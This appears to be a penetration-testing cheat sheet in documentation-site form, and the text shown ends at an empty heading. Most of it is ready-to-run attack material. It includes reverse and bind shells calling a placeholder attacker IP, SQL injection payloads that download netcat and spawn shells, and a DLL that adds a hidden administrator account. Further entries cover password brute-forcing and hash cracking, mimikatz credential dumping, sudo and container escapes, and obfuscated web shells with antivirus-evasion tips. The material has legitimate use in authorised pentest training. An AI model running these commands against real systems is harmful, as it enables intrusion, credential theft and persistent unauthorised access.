msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -b "\x00\x0A\x0D" -f python

Example exploit structure:

buffer = b"A" * <offset>
buffer += b"\x83\x0c\x09\x10"  # JMP ESP
buffer += b"\x90" * 16  # NOP sled
buffer += shellcode  # Injected payload

Catch the reverse shell:

nc -lvnp <port>

docs.title: Exploit Example
docs.text:
Targeting Sync Breeze Enterprise 10.0.28:

searchsploit "Sync Breeze Enterprise 10.0.28"
searchsploit -m 42341

i686-w64-mingw32-gcc 42341.c -o exploit.exe -lws2_32
wine exploit.exe

docs.title: ELF & DLL Analysis
docs.text:
Tip

Start binary analysis with file, strings, and checksec — in that order. checksec shows what mitigations are in place (NX, ASLR, PIE, stack canary) and tells you what exploit techniques are viable before you open a disassembler.

Watch out

DLL hijacking requires the DLL search order to favour a writable path. Confirm with procmon (filter on PATH NOT FOUND + NAME NOT FOUND) — don't assume a missing DLL is exploitable without verifying you can write to that location.

docs.title: Identifying ELF Binaries
docs.text:
file <binary>
readelf -h <binary>
checksec --file=<binary>

docs.title: Common ELF Exploitation Techniques
docs.text:
1. SUID Exploitation

    find / -type f -perm -4000 2>/dev/null

    If a SUID binary calls system commands insecurely, inject malicious execution:

    echo "/bin/sh" > /tmp/ls; chmod +x /tmp/ls; PATH=/tmp:$PATH <binary>

  2. LD_PRELOAD Exploitation — if the binary loads shared libraries from user-controlled paths:

    void __attribute__((constructor)) init() { system("/bin/sh"); }

    gcc -shared -o /tmp/exploit.so -fPIC exploit.c
LD_PRELOAD=/tmp/exploit.so <binary>

  3. RPATH & RUNPATH Exploitation

    objdump -x <binary> | grep RPATH

    Inject a malicious shared library into the expected path.

  4. Buffer Overflows

    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <length>
gdb -q <binary>

docs.title: Identifying DLL Hijacking Opportunities
docs.text:
Use Procmon to find missing DLLs (filter on PATH NOT FOUND + NAME NOT FOUND).

(Get-Process -Id $pid).Modules | Select-Object ModuleName

docs.title: Creating a Malicious DLL
docs.text:
#include <windows.h>
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c net user attacker Password123! /add && net localgroup Administrators attacker /add");
    }
    return TRUE;
}

x86_64-w64-mingw32-gcc -shared -o hijack.dll hijack.c

docs.title: DLL Proxying
docs.text:
If replacing a DLL causes a crash:

  1. Copy the original DLL functions.
  2. Redirect calls while executing malicious code.

docs.title: Reflective DLL Injection
docs.text:
Native DLLs cannot be loaded with [System.Reflection.Assembly]::Load — that API only accepts .NET managed assemblies. For .NET payloads:

[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("C:\assembly.dll"))
[<Namespace.Class>]::<Method>()

For native (unmanaged) DLLs, use PowerSploit's Invoke-ReflectivePEInjection or a loader like Donut:

# PowerSploit (archived but still functional)
IEX (New-Object Net.WebClient).DownloadString('http://<attacker-ip>/Invoke-ReflectivePEInjection.ps1')
Invoke-ReflectivePEInjection -PEBytes ([IO.File]::ReadAllBytes("C:\malicious.dll")) -ForceASLR

Donut converts arbitrary PE files (EXE/DLL) into position-independent shellcode for injection via any loader:

donut -i malicious.dll -o payload.bin

docs.title: Brute Force & Hash Cracking
docs.text:
Tip

Rule-based cracking dramatically improves hit rates on real passwords. Start with rockyou.txt + best64.rule, then try dive.rule for corporate passwords (capitalisation, leetspeak, year suffixes).

Watch out

Hash type matters — identify with hashid or hash-identifier before running hashcat. Wrong mode = zero cracks with no error.

docs.title: SSH
docs.text: hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10

docs.title: RDP
docs.text: hydra -L users.txt -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10

docs.title: HTTP POST Form (Login)
docs.text: hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"

docs.title: Cracking Hashes with Hashcat
docs.text:
Common modes (-m) encountered in pentest engagements:

Hash Type Mode Source MD5 0 Generic SHA-1 100 Generic NTLM 1000 secretsdump.py, mimikatz LM 3000 Legacy Windows NetNTLMv1 5500 Responder NetNTLMv2 5600 Responder, SMB relay Kerberos 5 TGS-REP (Kerberoast) 13100 GetUserSPNs.py -request Kerberos 5 AS-REP (ASREProast) 18200 GetNPUsers.py DCC2 (Domain Cached) 2100 Local SAM cache bcrypt 3200 $2a$, $2b$ Argon2 34000 Modern web apps JWT HS256 16500 Web apps ZIP encrypted 13600 zip2john → hashcat PDF 1.7 L8 10700 pdf2john 7-Zip 11600 7z2john

Basic dictionary:

hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt

Rule-based attack (recommended default for domain creds):

hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
# or the corporate-flavoured rule
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/dive.rule

Mask attack for predictable password policies (Winter2024! / Company123!):

hashcat -m 1000 -a 3 hash.txt '?u?l?l?l?l?l?l?l?d?s'
hashcat -m 1000 -a 3 hash.txt 'Winter?d?d?d?d?s'

Combinator attack (two wordlists concatenated):

hashcat -m 1000 -a 1 hash.txt words1.txt words2.txt

docs.title: Cracking Hashes with John the Ripper
docs.text: john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

docs.title: SSH Private Key Passphrase
docs.text:
ssh2john id_rsa > ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash

docs.title: Pass-the-Hash
docs.text: nxc smb 10.10.10.10 -u admin -H <hash>

docs.title: Password Spraying
docs.text:
hydra -L users.txt -p Winter2023! ssh://10.10.10.10
nxc smb 10.10.10.10 -u users.txt -p "Winter2023!"

docs.title: Credential Dumping for Further Attacks
docs.text: mimikatz # sekurlsa::logonpasswords

docs.title: Bind & Reverse Shells
docs.text:
Situation Use Firewall blocks inbound to target Reverse shell Firewall blocks outbound from target Bind shell Need interactive shell upgrade python3 -c 'import pty; pty.spawn("/bin/bash")' then stty raw -echo; fg Target is Windows, no AV PowerShell reverse shell Target is Windows, AV active MSFVenom staged shellcode or manual C#

Tip

After catching a reverse shell, immediately upgrade it: python3 -c 'import pty; pty.spawn("/bin/bash")', then background with Ctrl+Z, run stty raw -echo; fg, then export TERM=xterm. Skipping this makes tab completion and Ctrl+C unusable.

Watch out

Netcat on BSD (macOS) doesn't support -e. Use ncat from nmap or mkfifo instead: rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.10.10 <port> >/tmp/f.

docs.title: Checking for Network Restrictions
docs.text: nc -zv 10.10.10.10 4444

docs.title: Setting Up a Netcat Listener
docs.text: nc -lvnp <port>

docs.title: Bash
docs.text: bash -c 'bash -i >& /dev/tcp/<attacker-ip>/9005 0>&1'

docs.title: Netcat (Windows EXE via MSFVenom)
docs.text: msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f exe > winshell.exe

docs.title: Meterpreter
docs.text: msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <attacker-ip>;set LPORT 443;run;"

docs.title: SQLi (MSSQL via xp_cmdshell)
docs.text:
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;
EXEC xp_cmdshell 'certutil -urlcache -f http://<attacker-ip>:8000/nc.exe C:\windows\temp\nc.exe';
EXEC xp_cmdshell 'C:\windows\temp\nc.exe <attacker-ip> 9005 -e cmd.exe';--

docs.title: PostgreSQL SQLi
docs.text:
CREATE TABLE shell(output text); COPY shell FROM PROGRAM 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker-ip> 9443 >/tmp/f';

PostgreSQL shell tip

If the connection drops, drop the table (DROP TABLE shell;) or use a new table name — the COPY FROM PROGRAM will fail silently if the table already exists.

docs.title: Netcat
docs.text:
On the target:

nc -lvp <port> -e /bin/sh

Connect from attacker:

nc 10.10.10.10 <port>

docs.title: MSFVenom
docs.text:
msfvenom -p linux/x86/shell_bind_tcp LPORT=<port> -f elf > bind.elf

use exploit/multi/handler
set payload linux/x86/shell_bind_tcp
set RHOST 10.10.10.10
set LPORT <port>
exploit

docs.title: Upgrading to a Fully Interactive Shell
docs.text:
python3 -c 'import pty; pty.spawn("/bin/bash")'

If Python is unavailable:

script /dev/null -c "/bin/bash"

docs.title: Enable Tab-Completion
docs.text:
1. Press Ctrl+Z to background the nc session.
  2. Run stty raw -echo.
  3. Run fg to bring the session back.
  4. Run export TERM=xterm-256color.

docs.title: Checking for a Restricted Shell
docs.text:
echo $SHELL
echo $0

If output includes rbash, lshell, or another restricted shell, the environment is likely locked down.

Quick escape attempts

Try these in order — fastest to slowest:

  1. vi → :!/bin/bash (works often on misconfigured systems)
  2. python3 -c 'import os; os.system("/bin/bash")'
  3. perl -e 'exec "/bin/bash"'
  4. awk 'BEGIN {system("/bin/bash")}'

If PATH is restricted, use full paths: /bin/bash not bash.

Watch out

Some restricted shells log every command. Assume you're being monitored and avoid running suspicious enumeration scripts until you've fully escaped.

docs.title: Escaping rbash via SSH
docs.text:
ssh <user>@10.10.10.10 -t "bash --noprofile"
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

docs.title: Bypassing Restrictions with Built-in Commands
docs.text:
bash -i
sh -i
python -c 'import pty; pty.spawn("/bin/bash")'
env /bin/sh

docs.title: Breaking Out via Environment Variables
docs.text:
export PATH=/usr/local/bin:/usr/bin:/bin
export SHELL=/bin/bash
/bin/bash

docs.title: Exploiting Sudo to Escape
docs.text:
sudo -l
sudo /bin/bash

If a specific binary is allowed, cross-reference GTFOBins for the escape syntax. Common ones:

# less / more / man — enter pager, then escape
sudo less /etc/passwd
!/bin/sh

# vi / vim
sudo vi
:!/bin/sh

# find
sudo find . -exec /bin/sh \; -quit

# awk
sudo awk 'BEGIN {system("/bin/sh")}'

docs.title: Using GTFOBins
docs.text: GTFOBins (https://gtfobins.github.io/) documents every published escape for SUID binaries, sudo-allowed commands, and capability-enabled binaries. Always check it first — there's almost certainly an entry for any weirdly-allowed binary.

docs.title: Container Escapes
docs.text:
If you land in a Docker container, check for these escape paths:

# Root inside a privileged container → host via cgroup release_agent
cat /proc/self/status | grep CapEff                 # look for 0x0000003fffffffff (all caps)
ls -la /dev | grep -E 'sd|nvme|vd'                  # host block devices visible?

# Mounted docker.sock → launch a privileged container
ls -la /var/run/docker.sock
docker run -v /:/host -it --rm alpine chroot /host sh

# Kernel capabilities
capsh --print

docs.title: Upgrading to a Fully Interactive Shell
docs.text:
python -c 'import pty; pty.spawn("/bin/bash");'
script /dev/null -c "/bin/bash"

docs.title: Enable Tab-Completion
docs.text:
1. Press Ctrl+Z to background the nc session.
  2. Run stty raw -echo.
  3. Run fg to bring the session back.
  4. Run export TERM=xterm-256color.

docs.title: Web Shells
docs.text:
Tip

Obfuscate web shells to evade basic AV: <?php $f=base64_decode('c3lzdGVt');$f($_GET['c']); ?>. For more evasion, use variable variables or string concatenation.

Watch out

Web shells left on a server are an IoC. On a real engagement, document the path, use it, then remove it and confirm deletion in your report.

docs.title: Testing for File Upload Vulnerabilities
docs.text:
1. Upload a .php, .asp, .jsp, or .aspx file.
  2. Attempt to bypass restrictions by renaming extensions (shell.php.jpg, shell.php;, shell.phtml).
  3. Intercept with Burp Suite — change Content-Type to image/jpeg or modify extension filtering.
  4. Fuzz for uploaded file location:
ffuf -u http://example.com/uploads/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

docs.title: Basic PHP Web Shell
docs.text:
<?php system($_GET['cmd']); ?>

http://example.com/uploads/shell.php?cmd=id

docs.title: Reverse Shell via Web Shell
docs.text:
